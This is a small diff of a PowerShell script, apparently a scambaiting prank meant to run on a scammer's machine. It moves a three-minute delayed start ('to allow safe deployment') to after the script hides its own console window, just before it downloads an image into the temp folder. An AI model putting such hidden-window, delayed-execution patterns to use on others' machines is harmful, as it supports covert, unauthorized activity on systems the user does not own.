@@ -19,9 +19,6 @@ $number = "+0-800-126-129"
 $key = "fuckscammers"
 # ---------------------------------------------------------
 
-# Delay invoke (to allow safe deployment)
-Sleep 180
-
 # required setup
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -40,6 +37,9 @@ else{
     $h = $p.MainWindowHandle
     $t::ShowWindowAsync($h, 0)
 }
+
+# Delay invoke (to allow safe deployment)
+Sleep 180
 
 # Download image
 $tempFile = "$env:TEMP\cover.png"
